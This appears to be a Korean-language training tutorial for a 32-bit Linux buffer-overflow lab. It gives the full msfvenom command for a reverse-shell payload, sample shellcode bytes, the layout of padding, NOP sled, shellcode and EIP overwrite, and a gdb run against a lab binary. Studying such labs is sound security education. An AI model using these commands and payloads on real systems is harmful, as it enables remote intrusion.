# Shellcode 생성 실습

## 개요

버퍼 오버플로우 익스플로잇에서 최종적으로 시스템 쉘을 얻기 위해서는, CPU가 실행 가능한 **Shellcode**를 삽입해야 합니다.
이때 `msfvenom` 도구를 사용하여 원하는 플랫폼과 아키텍처에 맞는 shellcode를 생성할 수 있습니다.

하지만 shellcode를 만들기 전에 다음 사항들을 반드시 확인해야 합니다.

- 아키텍처 (예: x86, x64)
- 플랫폼 (예: Linux, Windows)
- Bad Characters (문제 발생 가능 바이트)
- 정확한 msfvenom 옵션 구성

---

## msfvenom을 이용한 Shellcode 생성

- 기본 형식:

```bash
msfvenom -p linux/x86/shell_reverse_tcp 
    lhost=<LHOST> lport=<LPORT> --format c 
    --arch x86 --platform linux 
    --bad-chars "<chars>" 
    --out <filename>
```

### 실습 예제

```bash
msfvenom -p linux/x86/shell_reverse_tcp 
    lhost=127.0.0.1 lport=31337 
    --format c 
    --arch x86 --platform linux 
    --bad-chars "\x00\x09\x0a\x20" 
    --out shellcode
```

- 실행 결과:

```
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
Saved as: shellcode
```

- Found 11 compatible encoders: 현재 선택한 페이로드에 사용할 수 있는 인코더가 11개 있다는 의미
- Attempting to encode payload with 1 iterations of x86/shikata_ga_nai: x86/shikata_ga_nai 인코더를 한 번 사용하여 페이로드를 인코딩하고 있다는 뜻
- x86/shikata_ga_nai chosen with final size 95: 인코딩된 shellcode의 최종 크기가 95 바이트이며, 해당 인코더가 선택되었다는 의미
- Payload size: 95 bytes: 실제 shellcode의 크기가 95바이트임을 의미.
- Final size of c file: 425 bytes: C언어 형식으로 포맷팅한 전체 파일 크기 (문자열 및 배열 구조 포함)
- Saved as: shellcode: 해당 결과물이 shellcode라는 파일명으로 저장되었음을 의미.

---

## shellcode 확인

```bash
cat shellcode
```

예시 출력:

```c
unsigned char buf[] =
"\xda\xca\xba\xe4\x11\xd4\x5d\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x12\x31\x50\x17\x03\x50\x17\x83\x24\x15\x36\xa8\x95\xcd\x41"
"\xb0\x86\xb2\xfe\x5d\x2a\xbc\xe0\x12\x4c\x73\x62\xc1\xc9\x3b"
...
```

* 여러 줄로 나뉜 shellcode를 하나의 문자열로 합쳐야 exploit에 삽입 가능

---

## Exploit Payload 구성

버퍼 총 길이: `1040 bytes`
구성 요소:

| 항목        | 값                                       |
| --------- | --------------------------------------- |
| Padding   | `"\x55"` \* 817 (`1040 - 124 - 95 - 4`) |
| NOP 슬라이드  | `"\x90"` \* 124                         |
| Shellcode | 위에서 생성한 95바이트                           |
| EIP 덮어쓰기  | `"\x66"` \* 4                           |

---

## GDB에서 실행

```bash
(gdb) run $(python -c 'print "\x55" * 817 + "\x90" * 124 + "<SHELLCODE>" + "\x66" * 4')
```

- 예시 출력:

```
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * 817 + "\x90" * 124 + "<SHELLCODE>" + "\x66" * 4')

Breakpoint 1, 0x56555551 in bowfunc ()
```

---

## Shellcode 위치 확인

- NOP 슬라이드 바로 뒤에 shellcode가 정상 삽입되었는지 확인
- EIP가 정확히 덮어써졌는지 확인
- Shellcode가 실제로 실행되어 리버스 연결이 수립되는지 테스트

---

## 요약

- `msfvenom`으로 대상 시스템에 맞는 shellcode 생성
- bad character를 제거하여 안전하게 인코딩
- 버퍼 구성 시 padding, NOP, shellcode, EIP를 정확히 계산
- gdb로 동작 검증 후 실제 익스플로잇 진행
